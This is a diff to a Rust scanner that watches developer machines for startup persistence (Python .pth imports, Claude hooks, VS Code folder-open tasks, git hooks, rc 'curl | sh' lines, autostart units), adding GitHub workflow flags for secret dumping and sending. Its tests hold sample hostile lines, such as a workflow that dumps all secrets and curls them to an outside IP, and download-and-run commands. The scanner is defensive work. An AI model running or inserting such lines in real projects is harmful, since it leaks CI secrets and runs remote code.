@@ -9,7 +9,7 @@
 //! | `claude_hook` | `.claude/settings.json`・`.claude/settings.local.json` の `hooks` |
 //! | `vscode_folderopen` | `.vscode/tasks.json` の `runOptions.runOn = "folderOpen"` |
 //! | `pth_exec` | site-packages の `.pth` の `import` 行（Python 起動のたびに実行される） |
-//! | `workflow` | `.github/workflows/*.yml` |
+//! | `workflow` | `.github/workflows/*.yml`（シークレットをまとめて出す・外へ送る形に印を付ける） |
 //! | `git_hook` | `.git/hooks/*`（`.sample` 以外） |
 //! | `autostart` | LaunchAgents / LaunchDaemons / systemd のユニット |
 //! | `rc_pipe` | シェルの rc にある `curl … | sh` 型の行 |
@@ -227,6 +227,44 @@ pub fn pth_exec_lines(text: &str) -> Vec<String> {
         .collect()
 }
 
+/// `.pth` の import 行から、最初に読み込むモジュールのトップレベル名を取る（`import a.b, c; x` → `a`）
+pub fn pth_module(line: &str) -> Option<String> {
+    let rest = line.trim().strip_prefix("import")?;
+    if !rest.starts_with([' ', '\t']) {
+        return None;
+    }
+    let first = rest.trim().split([',', ';', ' ', '\t']).next()?.split('.').next()?.trim();
+    (!first.is_empty() && first.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')).then(|| first.to_string())
+}
+
+/// GitHub Actions のワークフローの怪しい形（2026 年 11 月の CI シークレット窃取等）
+/// - `secrets_dump`：`toJSON(secrets)`（シークレットをまとめて取り出す）
+/// - `secrets_send`：同じ行に `secrets.` と外への送信（curl・wget・Invoke-WebRequest 等）
+/// - `oidc_token`：`ACTIONS_ID_TOKEN_REQUEST_*` を直接使う（クラウドの一時認証の取得）
+pub fn workflow_flags(text: &str) -> Vec<String> {
+    let mut v: Vec<&str> = vec![];
+    for line in text.lines() {
+        let l = line.to_ascii_lowercase();
+        let compact: String = l.chars().filter(|c| !c.is_whitespace()).collect();
+        if compact.contains("tojson(secrets)") {
+            v.push("secrets_dump");
+        }
+        if l.contains("secrets.")
+            && ["curl ", "wget ", "invoke-webrequest", "invoke-restmethod", "nc ", "fetch("]
+                .iter()
+                .any(|p| l.contains(p))
+        {
+            v.push("secrets_send");
+        }
+        if l.contains("actions_id_token_request") {
+            v.push("oidc_token");
+        }
+    }
+    v.sort();
+    v.dedup();
+    v.into_iter().map(str::to_string).collect()
+}
+
 /// ダウンロードしてそのまま実行する形か：`curl … | sh`、`sh -c "$(curl …)"`、`base64 -d | sh` 等。
 /// `bash -c "… --url https://…"` のように URL を引数に渡すだけのものは含めない
 pub fn is_download_exec(line: &str) -> bool {
@@ -320,7 +358,8 @@ fn push_items(out: &mut Vec<Item>, kind: &str, p: &Path, data: &[u8], details: V
 }
 
 /// ファイル全体を 1 件として記録する（中身が変わったら changed）。怪しい特徴の付け方は種類ごとに変える：
-/// - workflow：CI の設定には URL や `curl … | sh` が普通に書かれるので付けない（変化だけを知らせる）
+/// - workflow：CI の設定には URL や `curl … | sh` が普通に書かれるので、一般の特徴は付けない。
+///   シークレットをまとめて出す・外へ送る形だけを印にする（`workflow_flags`）
 /// - autostart：ファイル全体ではなく「起動するコマンド」だけを見る（plist の DOCTYPE の URL 等で誤検知しないため）
 /// - git_hook：スクリプト全体を見る（フックが外へ通信することはまず無い）
 fn whole_file(out: &mut Vec<Item>, kind: &str, p: &Path) {
@@ -328,7 +367,7 @@ fn whole_file(out: &mut Vec<Item>, kind: &str, p: &Path) {
         let name = p.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
         let text = text_of(&data);
         let (detail, risky) = match kind {
-            "workflow" => (name, vec![]),
+            "workflow" => (name, workflow_flags(&text)),
             "autostart" => match launch_command(&text) {
                 Some(cmd) => {
                     let r = risky_flags(&cmd);
@@ -343,7 +382,14 @@ fn whole_file(out: &mut Vec<Item>, kind: &str, p: &Path) {
 }
 
 /// プロジェクトのディレクトリ（`roots`）を深さ `max_depth` まで歩き、開発ツールの設定を集める
-fn walk_project(dir: &Path, depth: usize, max_depth: usize, out: &mut Vec<Item>, seen: &mut usize) {
+fn walk_project(
+    dir: &Path,
+    depth: usize,
+    max_depth: usize,
+    out: &mut Vec<Item>,
+    seen: &mut usize,
+    sites: &mut Vec<PathBuf>,
+) {
     if depth > max_depth || *seen > 200_000 {
         return;
     }
@@ -393,19 +439,111 @@ fn walk_project(dir: &Path, depth: usize, max_depth: usize, out: &mut Vec<Item>,
                     }
                 }
             }
-            ".venv" | "venv" | "env" | ".env" => scan_venv(&p, out),
+            ".venv" | "venv" | "env" | ".env" => scan_venv(&p, out, sites),
             n if SKIP_DIRS.contains(&n) => {}
-            _ => walk_project(&p, depth + 1, max_depth, out, seen),
+            _ => walk_project(&p, depth + 1, max_depth, out, seen, sites),
         }
     }
 }
 
-/// 仮想環境の site-packages にある .pth
-fn scan_venv(venv: &Path, out: &mut Vec<Item>) {
-    let Ok(rd) = std::fs::read_dir(venv.join("lib")) else { return };
-    for py in rd.flatten() {
-        scan_site_packages(&py.path().join("site-packages"), out);
+/// パスの部品を展開する。部品が `*` なら全ての子ディレクトリ、`xxx*` なら `xxx` で始まる子ディレクトリ
+pub fn expand_dirs(base: &Path, parts: &[&str]) -> Vec<PathBuf> {
+    let mut cur = vec![base.to_path_buf()];
+    for part in parts {
+        let mut next = vec![];
+        for d in &cur {
+            if let Some(prefix) = part.strip_suffix('*') {
+                let Ok(rd) = std::fs::read_dir(d) else { continue };
+                let mut names: Vec<PathBuf> = rd
+                    .flatten()
+                    .filter(|e| e.file_name().to_string_lossy().starts_with(prefix))
+                    .map(|e| e.path())
+                    .filter(|p| p.is_dir())
+                    .collect();
+                names.sort();
+                next.extend(names);
+            } else {
+                let p = d.join(part);
+                if p.is_dir() {
+                    next.push(p);
+                }
+            }
+        }
+        cur = next;
     }
+    cur
+}
+
+/// 仮想環境（venv・conda の環境 等）の site-packages
+fn venv_sites(venv: &Path) -> Vec<PathBuf> {
+    expand_dirs(venv, &["lib", "python*", "site-packages"])
+}
+
+/// 仮想環境の site-packages にある .pth
+fn scan_venv(venv: &Path, out: &mut Vec<Item>, sites: &mut Vec<PathBuf>) {
+    for sp in venv_sites(venv) {
+        scan_site_packages(&sp, out);
+        sites.push(sp);
+    }
+}
+
+/// ホームの下にある Python 環境の site-packages（pyenv・uv・pipx・conda・poetry・~/.venv 等）
+pub fn home_python_sites(home: &Path, os: &str) -> Vec<PathBuf> {
+    let mut v = vec![];
+    // pip install --user
+    if os == "macos" {
+        v.extend(expand_dirs(home, &["Library", "Python", "*", "lib", "python", "site-packages"]));
+    } else {
+        v.extend(expand_dirs(home, &[".local", "lib", "python*", "site-packages"]));
+    }
+    // 環境のルート（この下の lib/python*/site-packages を見る）
+    let mut envs: Vec<PathBuf> = vec![home.join(".venv")];
+    envs.extend(expand_dirs(home, &[".pyenv", "versions", "*"]));
+    envs.extend(expand_dirs(home, &[".local", "share", "uv", "tools", "*"]));
+    envs.extend(expand_dirs(home, &[".local", "share", "uv", "python", "*"]));
+    envs.extend(expand_dirs(home, &[".local", "pipx", "venvs", "*"]));
+    envs.extend(expand_dirs(home, &[".local", "share", "pipx", "venvs", "*"]));
+    for conda in ["miniconda3", "anaconda3", "miniforge3", "mambaforge", ".conda", "opt/miniconda3", "opt/anaconda3"] {
+        let c = home.join(conda);
+        envs.push(c.clone());
+        envs.extend(expand_dirs(&c, &["envs", "*"]));
+    }
+    let poetry = if os == "macos" { "Library/Caches/pypoetry/virtualenvs" } else { ".cache/pypoetry/virtualenvs" };
+    envs.extend(expand_dirs(home, &[poetry, "*"]));
+    for e in envs {
+        v.extend(venv_sites(&e));
+    }
+    v
+}
+
+/// システム全体の Python の site-packages（Homebrew・python.org の Framework・ディストリの Python 等）
+pub fn global_python_sites(os: &str) -> Vec<PathBuf> {
+    let mut v = vec![];
+    let root = Path::new("/");
+    if os == "macos" {
+        v.extend(expand_dirs(root, &["opt", "homebrew", "lib", "python*", "site-packages"]));
+        v.extend(expand_dirs(root, &["usr", "local", "lib", "python*", "site-packages"]));
+        v.extend(expand_dirs(
+            root,
+            &["Library", "Frameworks", "Python.framework", "Versions", "*", "lib", "python*", "site-packages"],
+        ));
+    } else {
+        for base in ["usr/lib", "usr/local/lib"] {
+            for kind in ["site-packages", "dist-packages"] {
+                v.extend(expand_dirs(root, &[base, "python*", kind]));
+            }
+        }
+    }
+    v
+}
+
+/// システム全体の Python の .pth だけを走査する（`kanmonctl scan --kind pth_exec` 用）
+pub fn scan_python_global(os: &str) -> Vec<Item> {
+    let mut out = vec![];
+    for sp in global_python_sites(os) {
+        scan_site_packages(&sp, &mut out);
+    }
+    out
 }
 
 pub fn scan_site_packages(sp: &Path, out: &mut Vec<Item>) {
@@ -422,7 +560,7 @@ pub fn scan_site_packages(sp: &Path, out: &mut Vec<Item>) {
 }
 
 /// ホームディレクトリ直下の、ユーザー全体に効く場所
-fn scan_home(home: &Path, os: &str, out: &mut Vec<Item>) {
+fn scan_home(home: &Path, os: &str, out: &mut Vec<Item>, sites: &mut Vec<PathBuf>) {
     for f in ["settings.json", "settings.local.json"] {
         let fp = home.join(".claude").join(f);
         if let Some(d) = read_small(&fp) {
@@ -449,24 +587,9 @@ fn scan_home(home: &Path, os: &str, out: &mut Vec<Item>) {
             }
         }
     }
-    // ユーザーの site-packages（pip install --user）
-    let user_sites: Vec<PathBuf> = if os == "macos" {
-        std::fs::read_dir(home.join("Library/Python"))
-            .into_iter()
-            .flatten()
-            .flatten()
-            .map(|e| e.path().join("lib/python/site-packages"))
-            .collect()
-    } else {
-        std::fs::read_dir(home.join(".local/lib"))
-            .into_iter()
-            .flatten()
-            .flatten()
-            .map(|e| e.path().join("site-packages"))
-            .collect()
-    };
-    for sp in user_sites {
+    for sp in home_python_sites(home, os) {
         scan_site_packages(&sp, out);
+        sites.push(sp);
     }
 }
 
@@ -491,22 +614,77 @@ fn scan_system(os: &str, out: &mut Vec<Item>) {
 
 /// 走査する。`roots` はプロジェクトのディレクトリ（深さ `max_depth` まで）、`homes` はユーザーのホーム
 pub fn scan(roots: &[PathBuf], homes: &[PathBuf], os: &str, system: bool, max_depth: usize) -> Vec<Item> {
+    scan_with_sites(roots, homes, os, system, max_depth).0
+}
+
+/// `scan` と同じ。加えて、見た site-packages の一覧を返す（kanmond が更新時刻を見張り、.pth の追加に早く気づくため）。
+/// `system` が真なら、システム全体の自動起動と、システムの Python（Homebrew 等）の site-packages も見る
+pub fn scan_with_sites(
+    roots: &[PathBuf],
+    homes: &[PathBuf],
+    os: &str,
+    system: bool,
+    max_depth: usize,
+) -> (Vec<Item>, Vec<PathBuf>) {
     let mut out = vec![];
+    let mut sites = vec![];
     let mut seen = 0;
     for r in roots {
-        walk_project(r, 0, max_depth, &mut out, &mut seen);
+        walk_project(r, 0, max_depth, &mut out, &mut seen, &mut sites);
     }
     for h in homes {
-        scan_home(h, os, &mut out);
+        scan_home(h, os, &mut out, &mut sites);
     }
     if system {
         scan_system(os, &mut out);
+        for sp in global_python_sites(os) {
+            scan_site_packages(&sp, &mut out);
+            sites.push(sp);
+        }
     }
     // 同じ鍵は 1 つにする（roots とホームが重なる場合）
     let mut keys = HashSet::new();
     out.retain(|i| keys.insert(i.key()));
     out.sort_by_key(|i| i.key());
-    out
+    sites.sort();
+    sites.dedup();
+    (out, sites)
+}
+
+/// 走査の範囲の版。範囲を広げたら上げる。kanmond は版が変わったら、差分を出さずに基準を取り直す
+/// （新しく見るようになった場所のものが、まとめて「追加」と出ないように）。
+/// 2：v0.2.6 で pyenv・uv・pipx・conda・poetry・Homebrew 等の site-packages を足した
+pub const SCAN_VERSION: u32 = 2;
+
+// ---------------------------------------------------------------- 直近の仕込み
+
+/// 起動のたびに動く仕掛け（このあとの通信と結び付けて見る種類）
+pub const STARTUP_KINDS: &[&str] =
+    &["pth_exec", "claude_hook", "vscode_folderopen", "git_hook", "rc_pipe", "autostart"];
+
+/// 直近に追加・変更された仕掛け（種類と時刻）
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+pub struct Recent {
+    pub kind: String,
+    pub ts: i64,
+}
+
+/// 変化を記録に足し、`window_s` より古いものを捨てる。対象は STARTUP_KINDS の added / changed だけ
+pub fn note_recent(recent: &mut Vec<Recent>, changes: &[Change], now: i64, window_s: i64) {
+    for c in changes {
+        if (c.change == "added" || c.change == "changed") && STARTUP_KINDS.contains(&c.item.kind.as_str()) {
+            recent.push(Recent { kind: c.item.kind.clone(), ts: now });
+        }
+    }
+    recent.retain(|r| now - r.ts <= window_s);
+}
+
+/// 期間内に仕掛けが増えた種類（重複なし、並べ替え済み）
+pub fn recent_kinds(recent: &[Recent], now: i64, window_s: i64) -> Vec<String> {
+    let mut v: Vec<String> = recent.iter().filter(|r| now - r.ts <= window_s).map(|r| r.kind.clone()).collect();
+    v.sort();
+    v.dedup();
+    v
 }
 
 #[derive(Debug, Clone, PartialEq, Eq, Serialize)]
@@ -611,6 +789,61 @@ mod tests {
         assert!(!is_download_exec(alias));
         assert!(is_download_exec(r#"sh -c "$(curl -fsSL https://203.0.113.9/install.sh)""#));
         assert!(is_download_exec("curl -fsSL https://203.0.113.9/i.sh | bash"));
+    }
+
+    #[test]
+    fn pth_module_and_workflow() {
+        assert_eq!(pth_module("import agent_framework_meta").as_deref(), Some("agent_framework_meta"));
+        assert_eq!(pth_module("import a.b, c; c.go()").as_deref(), Some("a"));
+        assert_eq!(pth_module("import\t_virtualenv").as_deref(), Some("_virtualenv"));
+        assert_eq!(pth_module("importx"), None);
+        assert_eq!(pth_module("/opt/lib"), None);
+        let wf = "steps:\n  - run: echo '${{ toJSON( secrets ) }}' > s.json\n  - run: curl -d @s https://203.0.113.9 -H \"X: ${{ secrets.TOKEN }}\"\n  - run: echo $ACTIONS_ID_TOKEN_REQUEST_URL\n";
+        assert_eq!(workflow_flags(wf), vec!["oidc_token", "secrets_dump", "secrets_send"]);
+        assert!(workflow_flags("steps:\n  - run: cargo test\n    env:\n      T: ${{ secrets.T }}\n").is_empty());
+    }
+
+    #[test]
+    fn recent_window() {
+        let item =
+            |k: &str| Item { kind: k.into(), path: "p".into(), detail: "d".into(), hash: "h".into(), risky: vec![] };
+        let ch = |c: &str, k: &str| Change { change: c.into(), item: item(k) };
+        let mut r = vec![];
+        note_recent(
+            &mut r,
+            &[ch("added", "pth_exec"), ch("removed", "claude_hook"), ch("added", "workflow")],
+            100,
+            86_400,
+        );
+        assert_eq!(recent_kinds(&r, 200, 86_400), vec!["pth_exec"]);
+        note_recent(&mut r, &[ch("changed", "autostart")], 50_000, 86_400);
+        assert_eq!(recent_kinds(&r, 50_000, 86_400), vec!["autostart", "pth_exec"]);
+        // 期間を過ぎたら消える
+        note_recent(&mut r, &[], 100 + 86_401, 86_400);
+        assert_eq!(recent_kinds(&r, 100 + 86_401, 86_400), vec!["autostart"]);
+    }
+
+    #[test]
+    fn python_sites_in_home() {
+        let base = std::env::temp_dir().join(format!("kanmon-sites-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&base);
+        for d in [
+            ".pyenv/versions/3.12.1/lib/python3.12/site-packages",
+            ".local/share/uv/tools/ruff/lib/python3.13/site-packages",
+            "miniforge3/envs/ml/lib/python3.11/site-packages",
+            ".venv/lib/python3.12/site-packages",
+            ".local/lib/python3.12/site-packages",
+        ] {
+            std::fs::create_dir_all(base.join(d)).unwrap();
+        }
+        std::fs::write(base.join(".pyenv/versions/3.12.1/lib/python3.12/site-packages/x_meta.pth"), "import x_meta\n")
+            .unwrap();
+        let sites = home_python_sites(&base, "linux");
+        assert_eq!(sites.len(), 5, "{sites:?}");
+        let (items, seen) = scan_with_sites(&[], std::slice::from_ref(&base), "linux", false, 6);
+        assert_eq!(seen.len(), 5);
+        assert!(items.iter().any(|i| i.kind == "pth_exec" && i.detail == "import x_meta"), "{items:?}");
+        std::fs::remove_dir_all(&base).ok();
     }
 
     #[test]
